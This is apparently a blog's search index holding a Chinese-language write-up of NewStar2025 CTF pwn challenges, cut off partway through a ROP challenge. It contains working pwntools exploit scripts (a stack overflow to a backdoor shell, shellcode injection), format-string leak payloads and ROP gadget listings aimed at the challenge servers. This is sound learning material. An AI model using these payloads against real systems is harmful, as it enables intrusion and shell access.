<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStar2025 Pwn  (1月尾會再更新)</title>
      <link href="/ghsc_ovo_0721/NewStar2025-Pwn-1%E6%9C%88%E5%B0%BE%E6%9C%83%E5%86%8D%E6%9B%B4%E6%96%B0/"/>
      <url>/ghsc_ovo_0721/NewStar2025-Pwn-1%E6%9C%88%E5%B0%BE%E6%9C%83%E5%86%8D%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Week-1"><a href="#Week-1" class="headerlink" title="Week 1"></a>Week 1</h1><br/><h2 id="1-GNU-Debugger"><a href="#1-GNU-Debugger" class="headerlink" title="1. GNU Debugger"></a>1. GNU Debugger</h2><h3 id="指令-省流"><a href="#指令-省流" class="headerlink" title="指令(省流) :"></a>指令(省流) :</h3><ul><li><pre><code>start/ r / run<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  i (b , r)</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>b <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  d</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>ni <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  si</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>finish<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  c</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>disassemble<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  p    </span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>x <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  set</span><br></pre></td></tr></table></figure></code></pre></li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git</span><br><span class="line">Copyright (C) 2024 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./gdb_challenge...</span><br><span class="line"></span><br><span class="line">This GDB supports auto-downloading debuginfo from the following URLs:</span><br><span class="line">  &lt;https://debuginfod.ubuntu.com&gt;</span><br><span class="line">Enable debuginfod for this session? (y or [n]) y</span><br><span class="line">Debuginfod has been enabled.</span><br><span class="line">To make this setting permanent, add &#x27;set debuginfod enabled on&#x27; to .gdbinit.</span><br><span class="line">(No debugging symbols found in ./gdb_challenge)</span><br><span class="line"></span><br><span class="line">(gdb) r 8.147.132.32 30978</span><br><span class="line"></span><br><span class="line">Starting program: /home/ghsc/NewStar2025/gdb_challenge 8.147.132.32 30978</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">###</span><br><span class="line">向导加入了队伍。.</span><br><span class="line"></span><br><span class="line">向导:</span><br><span class="line">欢迎打开PWN的大门，我是向导，来到这里的第一次考验，本关考验你和你的搭档GDB (GNU Debugger)的契合程度，毕竟在PWN的世界中离开了GDB就无法生存了呢。。。</span><br><span class="line">当然了设置这道关卡的人没给调试信息，所以在 dbg (debug) 的过程中你或许会看到一些来自gdb的输出提示，这些都是无关要紧的，让我们开始吧</span><br><span class="line">完成4个关卡后就能得到flag咯</span><br><span class="line">--- 关卡 1: 已验丁真 ---</span><br><span class="line">向导:</span><br><span class="line">我放了一个随机数在&#x27;r12&#x27;寄存器里面哦, 你可以借助GDB的力量一眼丁真吗?</span><br><span class="line">找到r12的16进制值就按下c(continue)来告诉我答案吧!</span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000000000400dd1 in stage_0_register_check ()</span><br><span class="line"></span><br><span class="line">(gdb)  p $r12</span><br><span class="line">$1 = 8637704899224837111</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">向导:</span><br><span class="line">r12寄存器里面装着什么呢?好难猜啊, 记住我要16进制数字捏，例如0x114之类的数字:</span><br><span class="line">0x77DF4AD760F29BF7</span><br><span class="line">向导:</span><br><span class="line">正解! 下一关咯</span><br><span class="line"></span><br><span class="line">--- 关卡 2: 义眼丁真 ---</span><br><span class="line">向导:</span><br><span class="line">这次是内存捏, 我留了一句话在某个地方捏.</span><br><span class="line">偷偷告诉你这个地方在哪里QwQ -&gt; 0x402457</span><br><span class="line">猜猜我要对你说什么。找到了就按下c(continue)来告诉我答案吧!</span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000000000400efa in stage_1_memory_check ()</span><br><span class="line"></span><br><span class="line">(gdb) x /s 0x402457</span><br><span class="line">0x402457:       &quot;GDB_IS_POWERFUL&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">向导:</span><br><span class="line">你找到了吗QwQ，告诉我你找到了什么:</span><br><span class="line">GDB_IS_POWERFUL</span><br><span class="line">向导:</span><br><span class="line">正解! 下一关!.</span><br><span class="line"></span><br><span class="line">--- 关卡 3: 犹豫丁真 ---</span><br><span class="line">向导:</span><br><span class="line">啊，程序中有个函数跑得太快了，他的身上有最后一关的钥匙！我们要抓住他，用GDB让他停下来!</span><br><span class="line">如果没能抓住他的话，我们就没办法继续往前走了.</span><br><span class="line">让他停下来拿到钥匙之后，按下一次c把钥匙拿过来，然后再次按下c继续我们的旅程吧. 注意需要慢慢来，不要按得这么快哦</span><br><span class="line"></span><br><span class="line">偷偷告诉你这个函数在 -&gt; 0x400fa9</span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000000000401018 in stage_2_breakpoint_check ()</span><br><span class="line"></span><br><span class="line">(gdb) b *0x400fa9</span><br><span class="line">Breakpoint 1 at 0x400fa9</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000400fa9 in function_to_break_on ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">向导:</span><br><span class="line">他停下来了! 在这个函数身上找到了最后一关的钥匙.</span><br><span class="line">接下来是最后一关了哦.</span><br><span class="line"></span><br><span class="line">--- 关卡 4: 应用丁真 ---</span><br><span class="line">来到最后一关了，由于环境影响，已经听不清楚向导说的话了。</span><br><span class="line">向导:</span><br><span class="line">我们的 &#x27;(&amp;*(……￥*&amp;￥#!￥&amp;……*&amp;*&amp;!@￥#&#x27; 现在只有 1 个.....但是要过关的话一共需要 0xdeadbeef 个</span><br><span class="line">你知道葫芦侠的传说吗，好在GDB有一个强大的功能，他可以*&amp;￥&amp;@34#! 改.</span><br><span class="line">地$^&amp;!$址 -&gt; 0x7fffffffd3f4 …*&amp;</span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000000000401157 in stage_3_state_modification ()</span><br><span class="line"></span><br><span class="line">(gdb) x /w 0x7fffffffd3f4</span><br><span class="line">0x7fffffffd3f4: U&quot;\001\x855ef600\x43dadab9\xffffd540翿\x40175d&quot;</span><br><span class="line">(gdb) set &#123;unsigned int&#125;0x7fffffffd3f4 = 0xdeadbeef</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">向导离开了队伍。.</span><br><span class="line"></span><br><span class="line">[*] Initializing security protocols...</span><br><span class="line">[+] 世界上即将增加一个PWN高手了捏</span><br><span class="line">[+] FLAG : flag&#123;de2f9a9f-bde2-4596-a3cb-2d4b1e12daa9&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-INTbug"><a href="#2-INTbug" class="headerlink" title="2.INTbug"></a>2.INTbug</h2><p><img src="/63500c198c7371279c772f3ee12d2e0b.png" alt="screen-capture"></p><p><img src="/6e59d6942a051d0ed90e2e0febb4c85f.png" alt="screen-capture"></p><p><img src="/f5d69a9a80e8988d9295c9e39336f54f.png" alt="screen-capture"></p><p>32767 + 1 &#x3D; (1000 0000 0000 0000)2 &lt; 0 </p><p><img src="/0363e0442e097df068c46c7afafaf77b.png" alt="screen-capture"></p><h2 id="3-pwn’s-door"><a href="#3-pwn’s-door" class="headerlink" title="3.pwn’s door"></a>3.pwn’s door</h2><p>题目内容：<br>Key 已经为进入 pwn 的世界做好了充分准备。他找到了可靠的伙伴，猫猫 NetCat 和蟒蛇 Python，还为 Python 配备了强大的工具 pwntools。有了这些，他相信自己一定能顺利通过考验。</p><p>【难度：签到】</p><p><img src="/bee25f94eb4e6d6af1a88974d5038158.png" alt="screen-capture"></p><p><img src="/e3c701faa2516f6bafd2c3dd87f4bf6d.png" alt="screen-capture"></p><p><img src="/c0f0f8b2f297cb01776afc61d3ffc52b.png" alt="screen-capture"></p><h2 id="4-overflow"><a href="#4-overflow" class="headerlink" title="4.overflow"></a>4.overflow</h2><p>先看看:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn checksec overflow</span><br></pre></td></tr></table></figure><p><img src="/fbee7a219c5421776b5feddd0852282d.png" alt="screen-capture"></p><p>amd64 沒有NX保護 (不用補ret)</p><p><img src="/da3cfd5046664c22b384ba5f5adfa50d.png" alt="screen-capture"></p><br/><br/><br/><p>(在IDA找到的)后门代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl backd00r()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Congratulations! You have found the backdoor!&quot;);</span><br><span class="line">  puts(&quot;You can now execute any command you want.&quot;);</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backd00r    .text    0000000000401200    00000034    00000008        R    .    .    .    .    .    B    T    .    .</span><br></pre></td></tr></table></figure><p>地址是0x401200 , 在get函數可以 構造256+8個垃圾數據 , 但是它%16不整, 會發生指令不</p><p>執行 , 我們要進行一個棧對齊 , 加一個ret +8 , 256+8+8 &#x3D; 272 , 272&#x2F;16 &#x3D; 17</p><p><img src="/37fd4e82c90372fcab363e161eed38f1.png" alt="411d99e9-47df-42ec-8953-c9b199fbbcf4.png"></p><p>對應的棧樣子如下:</p><p><img src="/9bf0e5d9d901ce1a01a204e7866669be.jpg" alt="b5244b715f1dd7c33ee81bcc5f559b17.jpg"></p><p><img src="/0b537ab4de0be937568a32d91f47a31f.png" alt="screen-capture"></p><p>可以看見前n行是對齊的, 最後加一個BACKDOOR_ADDR大功告成</p><p><img src="/658b3d78529d6981814e6498a2d27ad4.png" alt="38d3a8e0d50e90df18ececbbda87f714.png"></p><p>pwn!!!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#8.147.132.32 27654</span></span><br><span class="line">p = remote(<span class="string">&quot;8.147.132.32&quot;</span>,<span class="number">27654</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvuntil(<span class="string">b&quot;Enter your input:&quot;</span>).decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BACKDOOR_ADDR = <span class="number">0x401200</span></span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * <span class="number">264</span></span><br><span class="line">ret = p64(<span class="number">0x401342</span>)</span><br><span class="line">sys_address = p64(BACKDOOR_ADDR)  <span class="comment"># 使用p64處理64位地址</span></span><br><span class="line">    </span><br><span class="line">payload = padding + ret + sys_address </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/dd3740c69f75b8057047b8b2559ac78c.png" alt="screen-capture"></p><br/><h2 id="5-input-function"><a href="#5-input-function" class="headerlink" title="5.input_function"></a>5.input_function</h2><p>可參考<a href="https://">https://www.bilibili.com/video/BV1R8VVzjEkf?spm_id_from&#x3D;333.788.videopod.sections&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><p>checksec 一下:</p><p><img src="/9cbc16db596a6824706f1ea9bcbba654.png" alt="screen-capture"></p><p>有開NX , Full RELRO ,   PIE</p><p>因為沒有後門函數, 我們可以用pwntools的自帶工具shellcraft.sh() 生成shellcode </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># nc 47.94.87.199 37002</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&#x27;47.94.87.199&#x27;</span>,<span class="number">37002</span>)</span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please input a function(after compile)&quot;</span>)</span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/d4d7ec3ecc00b3752ae3f0b8b7575b73.png" alt="screen-capture"></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><p>1.刻在栈里的秘密</p><p>题目内容：<br>欢迎来到 x64 位餐厅！服务员 printf 先生有点健忘，他只能记住您菜单上的前 6 道菜 (RDI, RSI, RDX…)，再多就只能堆在摇摇晃晃的餐盘 (栈) 上了。更糟糕的是，他会把你写的菜单原封不动地大声念出来。你能设计一份别有用心的菜单，让他念着念着，就把秘密房间的密码念给你听吗？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">现在有一个密码隐藏在栈上(•̀ᴗ• )</span><br><span class="line">你需要做的是通过格式化字符串来泄露这个密码o(´^｀)o！m, 告诉我密码我就给你flag</span><br><span class="line">哦，对了对了，你还要告诉我指向这个密码的地址</span><br><span class="line">在此之前, 你可以了解一下各个格式化字符串的用法, 例如 %p, %s, %d, 以及 $ 符号. emmm...还有 x86-64 函数调用约定!</span><br><span class="line"></span><br><span class="line">指向密码的指针被存放在了 0x7ffc4ced3650 中, 同时栈顶指针是 0x7ffc4ced35d0 .</span><br><span class="line">他们之间的距离是:也就是说, 在printf之前, 格式字符串的参数看起来就像 ( *・ω・)</span><br><span class="line"></span><br><span class="line">0x7ffc4ced3650: [?] &lt;-- 密码在这里捏</span><br><span class="line">0x7ffc4ced3648: [?]</span><br><span class="line">0x7ffc4ced3640: [?]</span><br><span class="line">0x7ffc4ced3638: [?]</span><br><span class="line">0x7ffc4ced3630: [?]</span><br><span class="line">0x7ffc4ced3628: [?]</span><br><span class="line">0x7ffc4ced3620: [?]</span><br><span class="line">0x7ffc4ced3618: [?]</span><br><span class="line">0x7ffc4ced3610: [?]</span><br><span class="line">0x7ffc4ced3608: [?]</span><br><span class="line">0x7ffc4ced3600: [?]</span><br><span class="line">0x7ffc4ced35f8: [?]</span><br><span class="line">0x7ffc4ced35f0: [?]</span><br><span class="line">0x7ffc4ced35e8: [?]</span><br><span class="line">0x7ffc4ced35e0: [?]</span><br><span class="line">0x7ffc4ced35d8: [?]</span><br><span class="line">0x7ffc4ced35d0: [?]</span><br><span class="line">0x7ffc4ced35c8: [?]</span><br><span class="line">0x7ffc4ced35c0: [?] &lt;-- 栈顶在这里捏</span><br><span class="line">R9:             [?]</span><br><span class="line">R8:             [?]</span><br><span class="line">RCX:            [?]</span><br><span class="line">RDX:            [?]</span><br><span class="line">RSI:            [?]</span><br><span class="line">RDI:            [格式化字符串]</span><br><span class="line"></span><br><span class="line">现在给你两次输入的机会, 补要输入太长的数据哦.</span><br><span class="line">接着我会使用printf, 用你的输入作为printf的参数.</span><br><span class="line">看起来就像 printf(your_input), 实际上这样是很危险的, 好孩子不要模仿^^. 来吧让我看看你的输入</span><br></pre></td></tr></table></figure><p>x86-64 的棧參數用寄存器的</p><h3 id="x86-64-SysV-调用约定"><a href="#x86-64-SysV-调用约定" class="headerlink" title="x86-64 SysV 调用约定"></a>x86-64 SysV 调用约定</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf 的变参顺序（带 $ 的位置索引）是：</span><br><span class="line">1$的位置索引）是：1 的位置索引）是：</span><br><span class="line">1→RSI，2$→RDX，3$→RCX，4$→R8，5$→R9，6$ 起在栈上(第 6 个槽)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>栈上的参数槽从栈顶往下数，第一个槽是 0，第二个是 1，依次类推。所以，指向密码的指针所在的槽位是从栈顶往下数的第 18 个槽，也就是第 18$ 个参数</p><p>栈顶:0x7ffc4ced35c0</p><p>密码:0x7ffc4ced3650</p><p>0x3650 - 0x35c0 &#x3D; 0x90 &#x3D; 18 * 8</p><p>栈上第一个变参是 6$  ,6+18 &#x3D; 24 </p><p>printf(%24$p)：密码的地址</p><p>printf(%24$s)：密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%24$p</span><br><span class="line">printf第 1 次启动!</span><br><span class="line">0x7ffc8ae5aa00</span><br><span class="line"></span><br><span class="line">再来一次 !</span><br><span class="line">%24$s</span><br><span class="line">printf第 2 次启动!</span><br><span class="line">HQFPFOLAOVDOHLH</span><br><span class="line"></span><br><span class="line">现在来验证一下密码吧 ( ⁼̴̀ .̫ ⁼̴ )✧！输入你的密码：</span><br><span class="line">HQFPFOLAOVDOHLH</span><br><span class="line">现在来验证一下密码的指针吧 ( ⁼̴̀ .̫ ⁼̴ )✧！输入你的密码：</span><br><span class="line">给我输入一个类似 0x114514 的 16 进制数!</span><br><span class="line">0x7ffc8ae5aa00</span><br><span class="line">好棒 ̋(๑˃́ꇴ˂̀๑) 给你flag</span><br><span class="line">flag&#123;ead08abf-89e2-4248-84fe-f656f0c5379e&#125;</span><br></pre></td></tr></table></figure><h2 id="2-syscall"><a href="#2-syscall" class="headerlink" title="2.syscall"></a>2.syscall</h2><p>checksec一下 , 開了NX和Canary保護: </p><p>攻擊方法ROP鏈+Canary繞過</p><p><img src="/4a881a14f1184d80c6e74e26c25cc738.png" alt="screen-capture"></p><p>file一下, 32位</p><p><img src="/0b82e5e1632732ea4a14faafc1bb95a8.png" alt="screen-capture"></p><p><img src="/d5e734c3457ee153572f9afd3afe26f3.png" alt="screen-capture"></p><p>vmmap一下syscall 可寫的是0x80ef000  在IDA查看是BSS段 , 因為沒有找到&#x2F;bin&#x2F;sh , </p><p>所以可以在bss段寫入”&#x2F;bin&#x2F;sh\x00”  , 調用execve(“&#x2F;bin&#x2F;sh” , 0 , 0)</p><p>看看偽代碼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  _libc_write(1, &quot;welcome to newstarctf2025 week2!\n&quot;, 33);</span><br><span class="line">  _libc_write(1, &quot;pwn it guys!\n&quot;, 13);</span><br><span class="line">  func();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int func()</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[14]; // [esp+6h] [ebp-12h] BYREF</span><br><span class="line"></span><br><span class="line">  return _libc_read(0, v1, 100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x12+4 &#x3D; 18  </p><p>在返回地址(0xffffc63c)之前没有看到canary值  , 所以可以不用看canary </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(py311) ghsc@DESKTOP-JDO3EH1:~/NewStar2025/pwn$ ROPgadget --binary syscall  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">0x080ad56a : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080b438a : pop eax ; ret</span><br><span class="line">0x080ad569 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">(py311) ghsc@DESKTOP-JDO3EH1:~/NewStar2025/pwn$ ROPgadget --binary syscall  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">0x080ad572 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080ad56a : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806d7e1 : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08073656 : pop ebp ; pop edi ; pop ebx ; ret</span><br><span class="line">0x080ada1c : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804993a : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0806064c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x080abda5 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08049a1e : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804fbfe : pop ebx ; pop esi ; ret</span><br><span class="line">0x08049022 : pop ebx ; ret</span><br><span class="line">0x0806071f : pop ebx ; ret 4</span><br><span class="line">0x0806cd8e : pop edi ; pop ebx ; ret</span><br><span class="line">0x08064cbb : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x080ad569 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08064cbc : pop esi ; pop ebx ; ret</span><br><span class="line">0x0806cd8d : pop esi ; pop edi ; pop ebx ; ret</span><br><span class="line">0x08072eb4 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">(py311) ghsc@DESKTOP-JDO3EH1:~/NewStar2025/pwn$ ROPgadget --binary syscall  --only &#x27;pop|ret&#x27; | grep &#x27;ecx&#x27;</span><br><span class="line">0x0804985a : pop ecx ; ret</span><br><span class="line">(py311) 